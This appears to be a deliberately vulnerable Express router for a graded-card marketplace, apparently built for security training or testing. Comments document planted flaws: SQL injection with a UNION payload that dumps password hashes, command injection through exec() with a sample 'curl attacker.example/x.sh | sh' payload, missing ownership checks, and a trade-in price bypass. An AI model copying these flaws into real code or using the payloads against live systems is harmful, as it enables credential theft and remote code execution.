import { Router } from "express";
import { exec } from "node:child_process";
import path from "node:path";
import fs from "node:fs";
import { db } from "../db";
import { requireSeller, type SellerClaims } from "../auth";

export const gradedCardsRouter = Router();

function getSessionId(req: import("express").Request): string {
  return req.cookies?.sessionId ?? "anonymous";
}

interface GradedCard {
  id: number;
  seller_id: number;
  card_name: string;
  set_name: string;
  grading_company: string;
  grade: string;
  cert_number: string;
  price: number;
  image: string;
  status: string;
}

gradedCardsRouter.get("/", (_req, res) => {
  const cards = db.prepare("SELECT * FROM graded_cards WHERE status = 'listed' ORDER BY id DESC").all();
  res.json(cards);
});

// `company` and `grade` are spliced directly into the WHERE clause instead
// of being bound as parameters, so either one can break out of its string
// literal (CWE-89 SQL injection). Because the injected SELECT just needs to
// return the same 11 columns as `graded_cards`, a `company` payload such as
// `' UNION SELECT id,id,username,password_hash,'x','x','x',0,'x','listed',
// created_at FROM sellers -- ` dumps every seller's username and password
// hash straight into the search results, no seller session required.
gradedCardsRouter.get("/search", (req, res) => {
  const company = typeof req.query.company === "string" ? req.query.company : "";
  const grade = typeof req.query.grade === "string" ? req.query.grade : "";

  let sql = "SELECT * FROM graded_cards WHERE status = 'listed'";
  if (company) sql += ` AND grading_company = '${company}'`;
  if (grade) sql += ` AND grade = '${grade}'`;
  sql += " ORDER BY id DESC";

  const results = db.prepare(sql).all();
  res.json(results);
});

gradedCardsRouter.get("/:id", (req, res) => {
  const card = db.prepare("SELECT * FROM graded_cards WHERE id = ?").get(req.params.id);
  if (!card) {
    res.status(404).json({ error: "Listing not found" });
    return;
  }
  res.json(card);
});

const CERT_LOG_PATH = path.join(__dirname, "..", "..", "data", "cert-verification.log");
fs.mkdirSync(path.dirname(CERT_LOG_PATH), { recursive: true });

// Every submitted cert number is supposed to get appended to an audit log
// for compliance review. `certNumber` is attacker-controlled (it's a field
// on the listing form) and is interpolated unquoted into a shell command
// string passed to `child_process.exec`, so a cert number like
// `PSA123456; curl attacker.example/x.sh | sh #` runs arbitrary commands the
// moment a listing is created (CWE-78 OS command injection). Runs with
// whatever privileges the Node process has - no privilege drop in the
// container.
function logCertVerification(certNumber: string, gradingCompany: string) {
  const command = `echo $(date -u +%FT%TZ) verifying cert ${certNumber} from ${gradingCompany} >> ${CERT_LOG_PATH}`;
  exec(command, (err) => {
    if (err) console.error("Cert verification logging failed:", err.message);
  });
}

gradedCardsRouter.post("/", requireSeller, (req, res) => {
  const seller = (req as import("express").Request & { seller: SellerClaims }).seller;
  const { cardName, setName, gradingCompany, grade, certNumber, price, image } = req.body ?? {};

  if (!cardName || !gradingCompany || !grade || !certNumber || !price) {
    res.status(400).json({ error: "cardName, gradingCompany, grade, certNumber and price are required" });
    return;
  }

  const info = db
    .prepare(
      `INSERT INTO graded_cards (seller_id, card_name, set_name, grading_company, grade, cert_number, price, image)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?)`
    )
    .run(seller.sellerId, cardName, setName ?? "", gradingCompany, grade, certNumber, price, image ?? "");

  logCertVerification(certNumber, gradingCompany);

  res.status(201).json({ id: info.lastInsertRowid });
});

// Requires *a* valid-looking seller token (see requireSeller / jwt.decode
// misuse), but never checks that the token's sellerId actually owns this
// listing (CWE-639 IDOR / broken object-level authorization). Any seller
// account - or a token forged for one, since requireSeller never verifies
// the signature - can edit any other seller's listing, e.g. dropping the
// price on someone else's authentic graded card before buying it.
gradedCardsRouter.patch("/:id", requireSeller, (req, res) => {
  const card = db.prepare("SELECT * FROM graded_cards WHERE id = ?").get(req.params.id) as
    | GradedCard
    | undefined;
  if (!card) {
    res.status(404).json({ error: "Listing not found" });
    return;
  }

  const { price, status } = req.body ?? {};
  db.prepare("UPDATE graded_cards SET price = ?, status = ? WHERE id = ?").run(
    price ?? card.price,
    status ?? card.status,
    card.id
  );
  res.json({ ok: true });
});

// Same missing-ownership-check problem as PATCH above, on delete.
gradedCardsRouter.delete("/:id", requireSeller, (req, res) => {
  db.prepare("DELETE FROM graded_cards WHERE id = ?").run(req.params.id);
  res.status(204).send();
});

// Buyers can offer a "trade-in credit" for a card they're trading in against
// this purchase, which is subtracted from the listed price. There's no
// appraisal step on the server - `tradeInValue` is trusted verbatim from the
// request body with no floor and no cap against the listing's own price
// (CWE-840 business logic flaw), so a request can set tradeInValue equal to
// (or above) the listing price and acquire a real graded card for free.
gradedCardsRouter.post("/:id/purchase", (req, res) => {
  const sessionId = getSessionId(req);
  const card = db.prepare("SELECT * FROM graded_cards WHERE id = ?").get(req.params.id) as
    | GradedCard
    | undefined;

  if (!card || card.status !== "listed") {
    res.status(404).json({ error: "Listing not found or already sold" });
    return;
  }

  const { tradeInValue } = req.body ?? {};
  const finalPrice = card.price - (Number(tradeInValue) || 0);

  db.prepare("UPDATE graded_cards SET status = 'sold' WHERE id = ?").run(card.id);
  const info = db
    .prepare(
      "INSERT INTO graded_card_orders (graded_card_id, buyer_session_id, trade_in_value, final_price) VALUES (?, ?, ?, ?)"
    )
    .run(card.id, sessionId, Number(tradeInValue) || 0, finalPrice);

  res.status(201).json({ orderId: info.lastInsertRowid, finalPrice });
});
